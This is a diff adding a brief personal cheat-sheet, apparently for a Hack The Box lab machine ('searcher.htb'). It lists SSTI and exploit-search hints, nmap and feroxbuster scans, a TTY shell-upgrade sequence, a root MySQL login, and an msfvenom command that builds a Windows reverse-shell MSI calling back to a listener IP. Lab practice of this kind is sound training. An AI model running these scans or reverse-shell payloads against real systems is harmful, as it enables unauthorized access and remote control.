@@ -1,0 +1,33 @@
+flask - try /console
+searchor
+ssti
+
+hacktricks 
+
+google
+exploit, vuln, hacktricks, poc
+exploitdb
+
+searchsploit searchor
+searchsploit -u to update
+
+feroxbuster auto find
+https://github.com/epi052/feroxbuster
+
+echo -e "10.10.11.x\tsearcher.htb" | sudo tee -a /etc/hosts
+
+nmap -T4 -A -v -oN busqueda.txt 10.10.11.208
+nmap $target --min-rate=5000 -oA init --open
+nmap -sV -sT <ip>
+
+Garr: sudo nmap $target -sV -sC -p- --min-rate=5000 -oA service
+
+python3 -c "import pty;pty.spawn('/bin/bash')"
+Ctrl+z
+stty raw -echo;fg
+
+--format='{{json .Config}}' $INSTANCE_ID
+mysql --host=127.0.0.1 --user=root --password=
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.2.3.40 LPORT=4444 -f msi > exploit.msi
+
